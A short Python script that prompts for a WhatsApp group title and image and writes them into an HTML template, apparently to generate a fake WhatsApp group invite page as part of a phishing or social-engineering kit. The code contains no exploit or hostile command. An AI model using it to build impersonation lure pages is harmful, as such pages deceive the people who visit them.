#!/usr/bin/env python3

import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = input(R + '#' + G + ' Group Title of whatsapp: ' + W)
image = input(R + '#' + G + ' Path to Group Image (Best Size : 300x300): ' + W)

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, 'template/whatsapp_seefu/images/{}'.format(img_name))
except Exception as e:
    print('\n' + R + '[-]' + R + ' Exception : ' + W + str(e))
    exit()

with open('template/whatsapp_seefu/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp_seefu/index.html', 'w') as new_index:
    new_index.write(code)